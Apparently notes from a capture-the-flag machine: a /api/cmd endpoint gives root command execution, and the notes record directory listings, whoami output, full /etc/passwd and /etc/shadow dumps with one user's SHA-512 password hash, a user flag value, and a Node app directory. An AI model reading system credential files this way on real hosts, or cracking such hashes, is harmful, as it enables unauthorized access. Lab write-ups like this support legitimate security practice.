## Commands

/api/cmd gives command execution

# ls

bin
boot
data
dev
etc
home
lib
lib64
local
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var

# pwd 

/

# whoami

root (!!!!)

# home dirs

bestadmin
ec2-user

# etc-passwd
```
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
libstoragemgmt:x:999:997:daemon account for libstoragemgmt:/var/run/lsm:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
ec2-instance-connect:x:998:996::/home/ec2-instance-connect:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
chrony:x:997:995::/var/lib/chrony:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin
ec2-user:x:1000:1000:EC2 Default User:/home/ec2-user:/bin/bash
mongod:x:996:994:mongod:/var/lib/mongo:/bin/false
bestadmin:x:1001:1001::/home/bestadmin:/bin/bash
tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
```

# etc-shadow
```
root:*LOCK*:14600::::::
bin:*:17919:0:99999:7:::
daemon:*:17919:0:99999:7:::
adm:*:17919:0:99999:7:::
lp:*:17919:0:99999:7:::
sync:*:17919:0:99999:7:::
shutdown:*:17919:0:99999:7:::
halt:*:17919:0:99999:7:::
mail:*:17919:0:99999:7:::
operator:*:17919:0:99999:7:::
games:*:17919:0:99999:7:::
ftp:*:17919:0:99999:7:::
nobody:*:17919:0:99999:7:::
systemd-network:!!:18065::::::
dbus:!!:18065::::::
rpc:!!:18065:0:99999:7:::
libstoragemgmt:!!:18065::::::
sshd:!!:18065::::::
rpcuser:!!:18065::::::
nfsnobody:!!:18065::::::
ec2-instance-connect:!!:18065::::::
postfix:!!:18065::::::
chrony:!!:18065::::::
tcpdump:!!:18065::::::
ec2-user:!!:18128:0:99999:7:::
mongod:!!:18128::::::
bestadmin:$6$MzQI89D0$4p.2RpwZIFmTxQgKL.ZIsABfpHkejb3x.TdxZWqhIeVF8YQf2zY2fUQAgVehQJp0mXi4GF74YSRpnLHuItUYn.:18128:0:99999:7:::
tss:!!:18128::::::
```

# home dir bestadmin

bin
new-room
run.sh 			Startup script. Mongodb && server
user.txt        5W7WkjxBWwhe3RNsWJ3Q

# new room 
controllers
cron.js
models
node_modules
package.json
package-lock.json
routes
server.js
views